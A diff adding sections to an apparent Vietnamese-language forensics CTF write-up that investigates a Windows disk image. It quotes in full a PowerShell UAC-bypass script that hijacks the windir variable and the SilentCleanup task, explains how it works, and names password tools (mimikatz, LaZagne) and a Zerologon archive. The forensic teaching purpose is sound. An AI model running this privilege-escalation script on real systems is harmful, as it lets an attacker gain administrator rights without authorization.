@@ -119,3 +119,93 @@ Vậy đây là người dùng đã thay đổi flag bằng cách sử dụng po
 flag: `flag{HarleyQuinnForQueen}`
 
 ### The same user found an exploit to escalate privileges on the computer. What was the message to the device owner?
+
+Ở đây chúng ta khi vào thư mục desktop của người dùng shreya, chúng ta cũng sẽ tìm được 1 file `exploit.ps1` file:
+
+```
+if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
+
+    #Payload goes here
+
+    #It'll run as Administrator
+
+    New-Item "C:\Users\H4S4N\Desktop\hacked.txt"
+
+    Add-Content C:\Users\H4S4N\Desktop\hacked.txt 'Flag{I-hacked-you}'
+
+    ##### https://youtu.be/C9GfMfFjhYI
+
+} else {
+
+    $registryPath = "HKCU:\Environment"
+
+    $Name = "windir"
+
+    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
+
+    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
+
+    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
+
+    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
+
+    Remove-ItemProperty -Path $registryPath -Name $name
+
+}
+```
+Phân tích nội dung script này. Ban đầu nó sử dụng 1 hàm `System.Security.Principal.WindowsIdentity]::GetCurrent()` để check xem nó đang được chạy với user nào nếu trùng với "S-1-5-32-544" - tức là SID của administrator, thì nó sẽ thực hiện việc tạo 1 file hacked.txt trong thư mục desktop của `H4S4N`. Còn nếu không nó sẽ thực thi lệnh else là một khối tấn công khác.
+
+Lệnh else tạo ra 3 biến `Name`, `registry Path`, `value`. Nó thực hiện tạo ra một biến môi trường `%windir%`, với một giá trị cho phép thực hiện lệnh powershell và bỏ qua các cơ chế bảo mật. Sau đó nó thực hiện chạy một `scheduler task` là `Silentcleanup` trong scheduler task thì tác vụ `Silentcleanup` cho phép nó chạy với đăng quyền cao nhất, theo đường dẫn `%windir%\system32\cleanmgr.exe`.
+
+Khi đó attacker khai thác điều này hắn đổi biến `%windir%` thành một script khác `powershell -ep bypass -w h $PSCommandPath;#` lúc này cho phép hắn chạy script trong phần `$PScommandPath` với đặc quyền cao nhất, và sử dụng `#` để comment đoạn sau.
+
+<img width="1441" height="796" alt="image" src="https://github.com/user-attachments/assets/c14d18e5-69d0-4027-91a5-f31760bce9fe" />
+
+Vậy ta có flag là `Flag{I-hacked-you}`
+
+### 2 hack tools focused on passwords were found in the system. What are the names of these tools? (alphabetical order)
+
+Ở đây em sẽ tìm tòi ở một số user khác trong các thư mục download, document,... Để tìm xem họ có dùng những công cụ gì:
+
+Thì đầu tiên em tìm thấy trong thư mục download của H4S4N có sử dụng công cụ `mimikatz`
+
+<img width="1393" height="792" alt="image" src="https://github.com/user-attachments/assets/983267b8-3ff5-4335-b68d-d9773d950d11" />
+
+Tiếp theo em sử dụng chỗ tìm kiếm từ khóa, và tìm đuôi `.exe` thử xem có kết quả không. Thi không có gì cả. Em nghĩ đây là một công cụ hack, thì chắc có thể là Windows Defender đã quét được nó, và chặn không cho nó tải xuống vào hệ thống, nên chúng ta có thể thử đi tìm kiếm trong thư mục Windows Defender `C:\Program Data\Microsoft\Windows Defender\Scan\History\Service\DetectionHistory` trong thư mục này em tìm hiểu trên mạng, thì nó sẽ chứa những file đã được tải về nhưng bị Windows Defender chặn và quét được.
+
+Ở thư mục con đầu tiên chúng ta thấy được công cụ mimikatz đã bị quét, nhưng chưa bị xóa khỏi hệ thống nên chắc có thể đây là những lần quét của Windows Defender phát hiện công cụ đáng nghi, hoặc có thể nó đang bị nén nên windows defender không quét được files trong winrar đó. 
+
+<img width="1391" height="786" alt="image" src="https://github.com/user-attachments/assets/bbd46f65-4715-42f7-85b7-7c3b7355bfec" />
+
+Ở thư mục `02` chúng ta thấy được Windows Defender đã phát hiện được 1 công cụ `HackTools` tên là `Lazagne`, được user H4S4N tải xuống hệ thống nhưng đã bị chặn, chắc bởi vì đây là cả một file `.exe` nên quá rõ ràng và đáng nghi nên Windows Defender đã chặn nó. 
+
+<img width="1397" height="797" alt="image" src="https://github.com/user-attachments/assets/fe06aa06-e7e8-46f4-befe-6e9f046e1ad7" />
+
+<img width="1249" height="1385" alt="image" src="https://github.com/user-attachments/assets/65e0b7c7-9ef5-45b5-8ff7-5edbf7802a70" />
+
+Ồ đây là công cụ thu thập mật khẩu, và 1 công cụ bẻ mật khẩu.
+
+<img width="467" height="215" alt="image" src="https://github.com/user-attachments/assets/df164df3-f387-4d55-9ffc-5ef0b46beb6b" />
+
+### There is a YARA file on the computer. Inspect the file. What is the name of the author?
+
+Câu này vì đây là đuôi lạ nên em search thử file này là file gì rồi tìm kiếm thử trong `search keyword`. File `yara` là một file chứa các định nghĩa mẫu theo (form) để công cụ Yara có thể dùng để nhận diện các phần mềm độc hại. file yara có đuôi file là `yar`. Giờ chúng ta sử dụng công cụ `File Search Attribute` trong `autopsy` để tìm file. 
+
+<img width="1427" height="850" alt="image" src="https://github.com/user-attachments/assets/f06f5f45-cebd-4614-95de-f66688e04543" />
+
+Tên công cụ này là `kiwi_passwords.yar` và author của công cụ này là `Benjamin DEPLY "gentilkiwi"`
+
+<img width="467" height="199" alt="image" src="https://github.com/user-attachments/assets/b9b2929a-635c-4c1b-8242-85aee65d303e" />
+
+### One of the users wanted to exploit a domain controller with an MS-NRPC based exploit. What is the filename of the archive that you found? (include the spaces in your answer) 
+
+Khi em tìm kiếm kĩ thuật `MS-NRPC exploit` thì nó trả về đây là một lỗ hổng [ZeroLogon](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/zerologon-vulnerability/)
+
+<img width="3212" height="1426" alt="image" src="https://github.com/user-attachments/assets/788bbd8c-c65b-4537-9074-4597c67f9e74" />
+
+Em thực hiện tìm kiếm từ khóa này và nó trả về một kết quả trong thư mục `
+/img_HASAN2.E01/vol_vol3/Users/sandhya/AppData/Roaming/Microsoft/Windows/Recent/2.2.0 20200918 Zerologon encrypted.lnk`. Vậy là chúng ta có thể hiểu được rằng. Người dùng `sandya` này đã bị thâm nhập vào thông qua một lỗ hổng cũ trong lỗ hổng `Zerologon` là `NetLogon`, sau đó hắn đã thực hiện leo quyền lên admin `H4S4N`, cài một script độc hại vào trong task Scheduler để nó thực thi mỗi ngày bên trong hệ thống cục bộ này. Có thể là hắn cũng đã sử dụng các công cụ như mimikatz để crack các mật khẩu của người dùng khác, và công cụ `lazagne` để thu thập các mật khẩu có thể lấy được trong môi trường miền cục bộ này.
+
+<img width="1402" height="793" alt="image" src="https://github.com/user-attachments/assets/74273980-f669-4205-9d85-404ba15b08d7" />
+
+<img width="1426" height="146" alt="image" src="https://github.com/user-attachments/assets/2b8aad48-1c2e-432f-bb11-0682832b8f98" />
